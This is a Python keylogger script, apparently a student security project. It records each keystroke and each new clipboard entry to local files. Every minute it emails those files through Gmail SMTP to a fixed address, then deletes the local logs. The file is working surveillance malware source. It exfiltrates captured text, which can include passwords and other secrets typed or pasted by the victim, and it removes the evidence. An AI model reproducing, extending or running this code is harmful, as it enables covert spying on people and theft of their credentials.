from pynput import keyboard
from pyperclip import waitForNewPaste

import smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

from datetime import datetime
from os import remove
from time import sleep
import threading

# Keyboard logger
def on_press(key):
    with open("log.txt", "a") as log:
        try:
            log.write(key.char + "\n")
            print(key.char)
        except AttributeError:
            # I think I might want to deal with space here
            if key == keyboard.Key.space:
                log.write(" \n")
                print(" ")
        log.close()

def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Collect events until released
def keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Clipboard logger
def cliplogger():
    while True:
        clip = waitForNewPaste()
        with open("cliplog.txt", "a") as cliplog:
            cliplog.write(clip + "\n")
            print(clip)

# Send email and wipe log
def send_logs():

    # Get log time
    now = datetime.now()
    date_time = now.strftime("%d/%m/%Y, %H:%M:%S")

    # Set log details
    msg = MIMEMultipart()
    msg['From'] = "scruffy.comp681.sa@gmail.com"
    msg['To'] = "scruffy.comp6841.sa@gmail.com"
    msg['Subject'] = f"log: {date_time}"

    # Attach log files
    filename1 = "log.txt"
    filename2 = "cliplog.txt"

    with open(filename1, "rb") as fp:
        part1 = MIMEBase("application", "octet-stream")
        part1.set_payload(fp.read())
    encoders.encode_base64(part1)

    with open(filename2, "rb") as fp:
        part2 = MIMEBase("application", "octet-stream")
        part2.set_payload(fp.read())
    encoders.encode_base64(part2)
    
    part1.add_header("Content-Disposition", f"attachment; filename= {filename1}")
    part2.add_header("Content-Disposition", f"attachment; filename= {filename2}")
    msg.attach(part1)
    msg.attach(part2)

    # Send email
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
    server.login("scruffy.comp6841.sa@gmail.com", "REDACTED")
    server.sendmail("scruffy.comp6841.sa@gmail.com", "scruffy.comp6841.sa@gmail.com", msg.as_string())

    # Delete logs
    remove(filename1)
    remove(filename2)

# Email loop
def loopEmail():
    while True:
        sleep(60)
        send_logs()

# Plan: Run simultaneous threads for processes
keyThread = threading.Thread(target=keylogger)
clipThread = threading.Thread(target=cliplogger)
emailThread = threading.Thread(target=loopEmail)

keyThread.start()
clipThread.start()
emailThread.start()
